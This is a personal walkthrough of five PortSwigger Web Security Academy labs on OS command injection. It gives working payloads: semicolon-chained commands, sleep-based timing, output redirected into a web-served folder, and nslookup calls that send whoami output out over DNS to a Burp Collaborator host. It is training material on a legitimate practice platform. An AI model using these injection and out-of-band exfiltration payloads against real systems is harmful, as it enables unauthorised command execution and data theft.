---
created: 2026-05-05
---

| `#`  | Solved? | Name                                                          | Date    | Notes         |
| ---- | ------- | ------------------------------------------------------------- | ------- | ------------- |
| `1.` | `✓`     | OS command injection, simple case                             | `05.05` |               |
| `2.` | `✓`     | Blind OS command injection with time delays                   | `05.05` |               |
| `3.` | `✓`     | Blind OS command injection with output redirection            | `05.05` |               |
| `4.` | `✓`     | Blind OS command injection with out-of-band interaction       | `07.06` | #Collaborator |
| `5.` | `✓`     | Blind OS command injection with out-of-band data exfiltration | `07.06` | #Collaborator |

## 1. OS command injection, simple case

>[!note]+ Lab description
> - [`Lab: OS command injection, simple case`](https://portswigger.net/web-security/os-command-injection/lab-simple)
> - Level: #Apprentice 
> 
> 
> This lab contains an OS command injection vulnerability in the product stock checker.
> 
> The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
> 
> To solve the lab, execute the `whoami` command to determine the name of the current user.

### Solution

- The vulnerability is in the `Check stock` functionality. To see it, add `;` after the `productId` parameter value:

```bash
productId=1;&storeId=1
```

- Output:

```bash
/home/peter-Rxoj5h/stockreport.sh: line 5: $2: unbound variable
sh: 1: 1: not found
```

![[images/walkthrough/PortSwigger/OS Command Injection/lab1/1.png]]

- If you insert `whoami` after the `productId` parameter value, you'll see this error:

```bash
productId=1;whoami&storeId=1
```

```bash
/home/peter-Rxoj5h/stockreport.sh: line 5: $2: unbound variable
whoami: extra operand '1'
Try 'whoami --help' for more information.
```

![[images/walkthrough/PortSwigger/OS Command Injection/lab1/2.png]]


- The `Check stock` functionality must be constructing a shell command under the hood, something like:

```bash
check_stock.sh --productId 1 --storeId 1
```

- So `whoami` after `productId` does:

```bash
check_stock.sh --productId 1; whoami --storeId 1
```

- `whoami` doesn't have such an option. 

- This is also why appending a semicolon after `storeId` does nothing:

```bash
check_stock.sh --productId 1 --storeId 1;
```

- So, this should do instead:

```bash
check_stock.sh --productId 1; whoami # --storeId 1
```

- In parameters:

```bash
productId=1;whoami%20#&storeId=1
```

![[images/walkthrough/PortSwigger/OS Command Injection/lab1/3.png]]

- Or this:

```bash
check_stock.sh --productId 1 --storeId 1;whoami
```

- In parameters:

```bash
productId=1&storeId=1;whoami
```

![[images/walkthrough/PortSwigger/OS Command Injection/lab1/4.png]]

![[images/walkthrough/PortSwigger/OS Command Injection/lab1/solved.png]]

Solved!

## 2. Blind OS command injection with time delays

>[!note]+ Lab description
> - [`Lab: Blind OS command injection with time delays`](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
> - Level: #Practitioner 
> 
> This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
> 
> To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

### Solution

- This time, the vulnerability is within the `Submit feedback` functionality:

![[images/walkthrough/PortSwigger/OS Command Injection/lab2/1.png]]

- Notice that benign request returns empty curly brackets `{}`.
- Adding a semicolon to the `email` parameter causes a `500 Server Error` error — a good sign:

```bash
csrf=jMYY24u5A2FPRxN8EASuxnZjxwdSc82T&name=name&email=email%40email.com;whoami%20&subject=subject&message=some+message
```

![[images/walkthrough/PortSwigger/OS Command Injection/lab2/2.png]]

- The error disappears if you append a commend character `#`:

```bash
csrf=jMYY24u5A2FPRxN8EASuxnZjxwdSc82T&name=name&email=email%40email.com;whoami%20#&subject=subject&message=some+message
```

![[images/walkthrough/PortSwigger/OS Command Injection/lab2/3.png]]

- Instead of `whoami`, execute `sleep 10`:

```bash
csrf=jMYY24u5A2FPRxN8EASuxnZjxwdSc82T&name=name&email=email%40email.com;sleep+10+#&subject=subject&message=some+message
```

- Observe around a 10-second delay:

![[images/walkthrough/PortSwigger/OS Command Injection/lab2/4.png]]

![[images/walkthrough/PortSwigger/OS Command Injection/lab2/solved.png]]

Solved!
## 3. Blind OS command injection with output redirection

>[!note]+ Lab description
> - [`Lab: Blind OS command injection with output redirection`](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
> - Level: #Practitioner 
> 
> This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
> 
> `/var/www/images/`
> The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
> 
> To solve the lab, execute the `whoami` command and retrieve the output.

### Solution

- One of the ways to exfiltrate data without OOB interaction is to redirect command output to files you can access from the web root, such as images at `/var/www/images/` like in this lab.
- First, confirm the injection to the `email` parameter using `sleep 10`:

![[images/walkthrough/PortSwigger/OS Command Injection/lab3/1.png]]

- Observe around 10-second delay.
- On the website, find an image, such as `5.jpg`:

![[images/walkthrough/PortSwigger/OS Command Injection/lab3/2.png]]

- Then run `whoami` redirecting output to `/var/www/images/5.jpg`:

```bash
email=email@email.com; whoami > /var/www/images/5.jpg #
```

```bash
csrf=bAib1pfEaDZTwmu0utBWdG7MUUXePVFn&name=name&email=email%40email.com%3b%20whoami%20%3e%20%2fvar%2fwww%2fimages%2f5.jpg%20%23&subject=subject&message=message
```

![[images/walkthrough/PortSwigger/OS Command Injection/lab3/3.png]]

- Then access the image again and inspect the request in `HTTP history`:

![[images/walkthrough/PortSwigger/OS Command Injection/lab3/4.png]]


![[images/walkthrough/PortSwigger/OS Command Injection/lab3/solved.png]]

Solved!
## 4. Blind OS command injection with out-of-band interaction

>[!warning] #Collaborator  Burp Collaborator (Professional Edition) is required to solve this lab.

>[!done]

>[!note]+ Lab description
> - [`Lab: Blind OS command injection with out-of-band interaction`](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
> - Level: #Practitioner 
> 
> 
> This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
> 
> To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

### Solution

- Submit a test feedback and observe the response. Send the request to `Repeater`.

![[images/walkthrough/PortSwigger/OS Command Injection/lab4/1.png]]

- The response includes curly brackets.
- Insert the payload after parameters one-by-one to see which triggers an interaction:

```bash
;nslookup%20<collaborator_id>.oastify.com%20#
```
```bash
;nslookup%203dhugns37bjub8fugcn8ts34mvsmgr4g.oastify.com%20#
```

![[images/walkthrough/PortSwigger/OS Command Injection/lab4/2.png]]

- After each attempt, go to `Collaborator` -> `Poll now`. See interaction after injection into the `email` parameter:

![[images/walkthrough/PortSwigger/OS Command Injection/lab4/3.png]]

![[images/walkthrough/PortSwigger/OS Command Injection/lab4/solved.png]]

Solved!

## 5. Blind OS command injection with out-of-band data exfiltration

>[!warning] #Collaborator  Burp Collaborator (Professional Edition) is required to solve this lab.

>[!done]

>[!note]+ Lab description
> - [`Lab: Blind OS command injection with out-of-band data exfiltration`](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
> - Level: #Practitioner 
> 
> This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
> 
> To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
### Solution


- To exfiltrate data OOB, you could trigger a DNS query to your Collaborator domain using the following syntax:

```bash
nslookup `whoami`.collaborator_id.oastify.com
```

>[!note] Notice double quotes. This technique won't work with single quotes.

- Payload:

```bash
||nslookup+`whoami`.<collaborator_id>.oastify.com||
```

- Send a test feedback. Then send that `POST` request to `Repeater`.
- Inject the payload into the `email` parameter:

![[images/walkthrough/PortSwigger/OS Command Injection/lab5/1.png]]

- Go to `Collaborator` -> `Poll now`:

![[images/walkthrough/PortSwigger/OS Command Injection/lab5/2.png]]

- Copy the username (`peter-...` till the first dot) and submit it as a solution.

![[images/walkthrough/PortSwigger/OS Command Injection/lab5/3.png]]

![[images/walkthrough/PortSwigger/OS Command Injection/lab5/solved.png]]

Solved!



